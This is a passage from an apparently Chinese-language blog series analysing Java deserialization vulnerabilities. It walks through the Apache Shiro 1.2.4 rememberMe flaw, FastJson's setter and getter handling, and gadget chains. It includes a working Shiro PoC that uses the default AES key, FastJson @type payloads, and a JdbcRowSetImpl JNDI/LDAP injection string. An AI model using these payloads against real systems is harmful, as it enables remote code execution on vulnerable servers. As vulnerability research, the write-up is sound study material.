class="params">(<span class="type">byte</span>[] decryptionCipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decryptionCipherKey = decryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到现在，我们已经明白，用户信息被做了AES加密</p>
<p>当加密数据都被返回后，下一步会执行rememberSerializedIdentity()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163615319.png" alt="image-20211223163615319"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163755978.png" alt="image-20211223163755978"></p>
<p><strong>因此我们可以判断出cookie中的rememberMe的产生流程</strong></p>
<ul>
<li>序列化用户名</li>
<li>AES加密序列化后的数据</li>
<li>base64编码处理上一步的数据</li>
<li>最后放入cookie</li>
</ul>
<h4 id="RememberMe解密"><a href="#RememberMe解密" class="headerlink" title="RememberMe解密"></a>RememberMe解密</h4><p>在AbstractRememberMeManager#getRememberedPrincipals下一个断点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165224129.png" alt="image-20211223165224129"></p>
<p>然后重启服务器，会被断下来</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165446209.png" alt="image-20211223165446209"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165804156.png" alt="image-20211223165804156"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165926366.png" alt="image-20211223165926366"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165955572.png" alt="image-20211223165955572"></p>
<p><strong>现在RememberMe解密的流程也显而易见:</strong></p>
<ul>
<li>从Cookie中获取RememberMe值</li>
<li>获取到的值进行base64解码</li>
<li>base64解码</li>
<li>反序列化</li>
</ul>
<h3 id="漏洞利用及POC"><a href="#漏洞利用及POC" class="headerlink" title="漏洞利用及POC"></a>漏洞利用及POC</h3><p>首先在pom.xml中添加commons-collections dependency</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意要reload maven（因为忘记重载maven，在这里卡了半天，发现后面的ClassLoader一直找不到class，调试半天也没搞明白为什么没有这个库）</p>
<p>这里我们将用到<strong>CommonsCollections11</strong>的链，CC6的链在此处不能打成功 - 因为Transformer[]会在寻找class的时候出现格式问题，其中会涉及到<strong>ParallelWebappClassLoader</strong>的父类<strong>WebappClassLoaderBase#loadClass</strong>；因此我们选择CommonCollections11这个链(没有Transformer[]数组)</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232137157.png" alt="image-20211223232137157"></p>
<p>详见 <a href="https://www.cnblogs.com/W4nder/p/14508817.html%EF%BC%8C%E6%88%91%E5%9C%A8%E6%AD%A4%E5%A4%84%E5%B0%B1%E4%B8%8D%E5%A4%9A%E8%AE%B2%E8%A7%A3%E3%80%82">https://www.cnblogs.com/W4nder/p/14508817.html，我在此处就不多讲解。</a></p>
<p><strong>POC构造</strong></p>
<p><strong>此处我新建了一个项目，同时导入了三个库</strong></p>
<ul>
<li>shiro-core-1.2.4</li>
<li>slf4j-api-1.6.4</li>
<li>slf4j-simple-1.6.4</li>
</ul>
<p>这三个jar包可以在shiro-web项目中找到: 打开shiro-web项目下的pom.xml文件，搜索这三个库，然后鼠标放在名字上面即可看到路径</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223233932961.png" alt="image-20211223233932961"></p>
<p>然后找到相应的目录，copy jar包并导入我们的POC项目即可</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223234007242.png" alt="image-20211223234007242"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<span class="comment">//默认密钥</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aesCipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] evilObj = getSerializedObj();<span class="comment">//得到byte数组类型的序列化数据</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">finalsource</span> <span class="operator">=</span> aesCipherService.encrypt(evilObj, DEFAULT_CIPHER_KEY_BYTES);<span class="comment">//对该恶意序列化数据进行AES加密</span></span><br><span class="line">        System.out.println(finalsource.toString());<span class="comment">//打印出加密后的rememberMe</span></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getSerializedObj() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>);<span class="comment">//加载cc11生成的恶意序列化文件</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((n=fileInputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么我们加密后可以直接返回**finalsource.toString()**，不是说最后要base64编码吗？</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232837239.png" alt="image-20211223232837239"></p>
<p>我们跟踪到最后可以发现，其返回了<strong>SimpleByteSource#toString()<strong>方法，而它就是返回了</strong>toBase64()</strong></p>
<p>现在我们将生成出来的一串字符复制到cookie的<strong>rememberMe</strong>处，执行后发现计算器弹出。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232449924.png" alt="image-20211223232449924"></p>
<h3 id="Reference-7"><a href="#Reference-7" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.cnblogs.com/W4nder/p/14508817.html">shiro-1.2.4反序列化分析踩坑</a></p>
<p>P神-Java漫谈</p>
<h1 id="FastJson反序列化漏洞系列"><a href="#FastJson反序列化漏洞系列" class="headerlink" title="FastJson反序列化漏洞系列"></a>FastJson反序列化漏洞系列</h1><h2 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h2><p>FastJson是由阿里巴巴开发的一个java库，可将对象快速转换为json字符，同时也可将json字符串转化为相应的对象</p>
<h2 id="Fastjson的基础使用"><a href="#Fastjson的基础使用" class="headerlink" title="Fastjson的基础使用"></a>Fastjson的基础使用</h2><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>在做RESTFUL项目的时候常常需要将json数据格式进行转换，比如将<code>&#123;name:&quot;leihehe&quot;, age: 18&#125;</code>转成Student类的Object</p>
<h3 id="环境搭建-9"><a href="#环境搭建-9" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>在MAVAN中添加fastjson即可，本文将分析1.2.4及其之后的各种版本，测试时将下面的version进行修改即可。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="将对象转化为json格式"><a href="#将对象转化为json格式" class="headerlink" title="将对象转化为json格式"></a>将对象转化为json格式</h3><p>首先准备一个User类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;constructor invoked&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get name&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set name&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写一个main方法测试：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">/* Serialization */</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result2</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);<span class="comment">//Label the class name</span></span><br><span class="line">        System.out.println(result);</span><br><span class="line">        System.out.println(result2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这里<code>toJSONString</code>有两种写法</p>
<ul>
<li><code>Json.toJSONString(obj)</code><ul>
<li>转换为JSON格式</li>
</ul>
</li>
<li><code>Json.toJSONString(obj,SerializerFeature.WriteClassName)</code><ul>
<li>在转换的JSON格式中指定该对象属于什么类</li>
</ul>
</li>
</ul>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108105129564.png" alt="image-20220108105129564"></p>
<p>可以发现<code>toJSONString</code>会call到get方法，其中第二种<code>JSONString</code>会返回@type，从而指明object所在类。</p>
<h3 id="将json格式转化为对象"><a href="#将json格式转化为对象" class="headerlink" title="将json格式转化为对象"></a>将json格式转化为对象</h3><p>FastJson有<strong>两种</strong>转换json格式为对象的方法</p>
<ul>
<li><code>JSON.parse(str)</code></li>
<li><code>JSON.parseObject(str)</code></li>
</ul>
<p>这两个其实都是一样的，只是<code>parseObject()</code>要比<code>parse()</code>多一个<code>toJson()</code>，也就是<code>parseObject()</code>返回的是<code>JSONObject</code>，而<code>parse()</code>返回的是其实际的类的对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> parse(text);</span><br><span class="line">    <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>parseObject()在实际运行的时候会调用get和set方法,其中get方法会在<code>toJSON()</code>中被调用</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108111958984.png" alt="image-20220108111958984"></p>
<p>而parse()只会调用对象的set方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112115321.png" alt="image-20220108112115321"></p>
<p>此处我们以<code>parse()</code>进行演示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Deserialization */</span></span><br><span class="line">String jsonString=<span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;leihehe\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> JSON.parse(jsonString);</span><br><span class="line">System.out.println(obj2);</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112140316.png" alt="image-20220108112140316"></p>
<p><strong>set</strong>方法并未被调用，因为fastJSON并不知道传过来的json应该被转换为哪一个类的对象，因此我们需要指定其<strong>type</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;entity.User\&quot;,\&quot;name\&quot;:\&quot;leihehe\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> JSON.parse(jsonString);</span><br><span class="line">System.out.println(obj2);</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112247858.png" alt="image-20220108112247858"></p>
<p>可见调用了constructor和set方法。</p>
<p>那么可以将恶意执行代码放在<code>User#setName()</code>里，就能执行了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;set name&quot;</span>);</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112504772.png" alt="image-20220108112504772"></p>
<h2 id="Setter和Getter调用的深入探究"><a href="#Setter和Getter调用的深入探究" class="headerlink" title="Setter和Getter调用的深入探究"></a>Setter和Getter调用的深入探究</h2><h3 id="JavaBeanInfo-build"><a href="#JavaBeanInfo-build" class="headerlink" title="JavaBeanInfo#build"></a>JavaBeanInfo#build</h3><p>Fastjson是如何调用对应的setter和getter的呢？</p>
<p>关键点在于JavaBeanInfo#build方法中</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108204218773.png" alt="image-20220108204218773"></p>
<p>因为我们传入的@type并不满足该条件，因此不会进入if里的语句。</p>
<h3 id="Setter"><a href="#Setter" class="headerlink" title="Setter"></a>Setter</h3><p>继续往下看，这里的methods实际是上面的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method[] methods = clazz.getMethods();<span class="comment">//获取到的是public的methods</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108204615107.png" alt="image-20220108204615107"></p>
<p>此处遍历了所有的methods，<strong>并要求满足以下条件</strong>：</p>
<blockquote>
<p><strong>method name的长度大于等于4</strong></p>
<p><strong>method只能有一种parameter</strong></p>
<p><strong>method并非static类型</strong></p>
<p><strong>method的返回类型必须为void或者当前method所在的class的类型</strong></p>
</blockquote>
<p>这样才能进入执行下面的语句</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108205558062.png" alt="image-20220108205558062"></p>
<p>根据不同的情况，会产生不同的propertyName，简单来说，都是依照java常见的书写方法的格式。</p>
<p>如果以上条件都不满足，则在method的第一个字符变为大写并在前面加上is作为field</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108210443480.png" alt="image-20220108210443480"></p>
<p>最后用add方法，将filed添加到filedInfo中</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108210555536.png" alt="image-20220108210555536"></p>
<h3 id="Getter"><a href="#Getter" class="headerlink" title="Getter"></a>Getter</h3><p>紧跟着的，是Getter的获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; var29; ++i) &#123;</span><br><span class="line">    method = var30[i];</span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())) &#123;</span><br><span class="line">        <span class="type">JSONField</span> <span class="variable">annotation</span> <span class="operator">=</span> (JSONField)method.getAnnotation(JSONField.class);</span><br><span class="line">        <span class="keyword">if</span> (annotation == <span class="literal">null</span> || !annotation.deserialize()) &#123;</span><br><span class="line">            String propertyName;</span><br><span class="line">            <span class="keyword">if</span> (annotation != <span class="literal">null</span> &amp;&amp; annotation.name().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                propertyName = annotation.name();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fieldInfo = getField(fieldList, propertyName);</span><br><span class="line">            <span class="keyword">if</span> (fieldInfo == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (propertyNamingStrategy != <span class="literal">null</span>) &#123;</span><br><span class="line">                    propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, (Field)<span class="literal">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, (JSONField)<span class="literal">null</span>, (String)<span class="literal">null</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出被调用的getter需要<strong>满足以下要求</strong>:</p>
<blockquote>
<p>Method name &gt;=4</p>
<p>method不是static类型的</p>
<p>method name必须以get开头</p>
<p>method name的第四个字符必须是大写</p>
<p>method是无参的</p>
<p>method的返回类型是Collection、Map、AtomicBoolean、AtomicInteger、或AtomicLong中的任意一个</p>
</blockquote>
<p>最后会被添加到FieldInfo中</p>
<p>Build方法的最后会返回一个<code>JavaBeanInfo</code></p>
<p><code>return new JavaBeanInfo(clazz, builderClass, defaultConstructor, (Constructor)null, (Method)null, buildMethod, jsonType, fieldList);</code></p>
<h2 id="Fastjson的反序列化流程"><a href="#Fastjson的反序列化流程" class="headerlink" title="Fastjson的反序列化流程"></a>Fastjson的反序列化流程</h2><p>在<code>JSON.parse()</code>处下个断点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164249197.png" alt="image-20220108164249197"></p>
<p>一直往下走，可以看见创建了<code>DefaultJSONParser</code>对象</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164603987.png" alt="image-20220108164603987"></p>
<p>跟进去看是如何创建的：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164636943.png" alt="image-20220108164636943"></p>
<p>这里会判断开头字符是否为<code>&#123;</code>，如果是，那么赋值token为12</p>
<p>接下来再进入parse()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164727601.png" alt="image-20220108164727601"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164746325.png" alt="image-20220108164746325"></p>
<p>因为之前token设置为12，所以跳入了case 12</p>
<p>创建一个新的<code>JSONObject</code>,并call到<code>parseObject()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164924577.png" alt="image-20220108164924577"></p>
<p>继续往下走：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108172115011.png" alt="image-20220108172115011"></p>
<p>在<code>TypeUtils#loadClass</code>中判断className，这里都不满足，因此跳过。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108173137665.png" alt="image-20220108173137665"></p>
<p><code>mappings.put(className, clazz);</code>将classname和对应的class放入mapping中，最后在进行反序列化。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108174017479.png" alt="image-20220108174017479"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108174039274.png" alt="image-20220108174039274"></p>
<h2 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h2><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p><code>JdbcRowSetImpl</code>可以配合JNDI+RMI或者JNDI+LDAP注入，如果不知道<a href="https://leihehe.top/2021/12/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3-9/">JNDI注入的师傅可以看这里</a></p>
<p>在JdbcRowSetImpl.class的connect方法中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());<span class="comment">//此处是关键</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getUsername() != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="built_in">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getUrl() != <span class="literal">null</span> ? DriverManager.getConnection(<span class="built_in">this</span>.getUrl(), <span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现了initialContext和lookup()，代表此处可以利用JNDI - 如果我们修改了<code>dataSourceName</code>为我们的RMI或者LDAP远程地址，那么就可以进行JNDI注入。</p>
<p>那么什么地方可以call到**connect()**呢</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn = <span class="built_in">this</span>.connect();</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在setAutoCommit方法中，会call到connect()方法。</p>
<h3 id="POC构造-4"><a href="#POC构造-4" class="headerlink" title="POC构造"></a>POC构造</h3><p>在之前的<strong>Fastjson的反序列化流程</strong>中，我们有说到fastjson可以调用public的set方法，<strong>那么我们就可以构造这样的一个</strong>jsonString</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String evilStr=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> JSON.parse(evilString);</span><br><span class="line"></span><br><span class="line">System.out.println(obj2);</span><br></pre></td></tr></table></figure>

<p>传入的json中，属性有dataSourceName和autoCommit，因此在使用<code>JSON.parse()</code>的时候，dataSource和autoCommit对应的<code>setDataSource()</code>和<code>autoCommit()</code>都会被call</p>
<p>从而能够执行以下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">initialContext.lookup(<span class="string">&quot;ldap://127.0.0.1:7777/#EvilObject&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108201834255.png" alt="image-20220108201834255"></p>
<h2 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h2><h3 id="利用链分析-1"><a href="#利用链分析-1" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>在cc链的分析中，我们多次用到了TemplatesImpl利用链，利用链如下</p>
<blockquote>
<p>TemplatesImpl#getOutputProperties()<br>  TemplatesImpl#newTransformer()<br>      TemplatesImpl#getTransletInstance()<br>          TemplatesImpl#defineTransletClasses()<br>              TransletClassLoader#defineClass()</p>
</blockquote>
<p>简单回顾一下，我们可以将生成的恶意字节码赋值给TemplatesImpl中的<code>_bytecodes</code>,最后在defineClass中，会将该恶意字节码读取进JVM中。</p>
<p>先写一个恶意字节码：</p>
